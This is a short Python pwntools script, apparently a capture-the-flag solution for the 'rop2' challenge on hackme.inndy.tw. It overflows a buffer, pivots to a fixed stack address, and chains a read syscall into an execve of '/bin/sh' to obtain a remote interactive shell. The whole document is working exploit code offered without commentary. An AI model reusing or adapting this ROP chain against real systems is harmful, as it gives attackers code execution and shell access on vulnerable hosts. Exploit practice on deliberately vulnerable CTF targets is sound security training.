#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

r = remote("hackme.inndy.tw", 7703)
#r = process("./rop2")
#gdb.attach(proc.pidof(r)[0])

stack_address = 0x804bf00
syscall = 0x804847c

payload = flat([
    syscall, 0x3, 0x0, stack_address, 4 * 6 + 0x8
])

payload2 = flat([
    0, syscall, 0xb, stack_address + 4 * 6, 0, 0
])

r.sendafter('Give me your ropchain:', b'A' * 12 + p32(stack_address) + payload)
r.recv()
r.send(payload2 + b'/bin/sh\x00')

r.interactive()
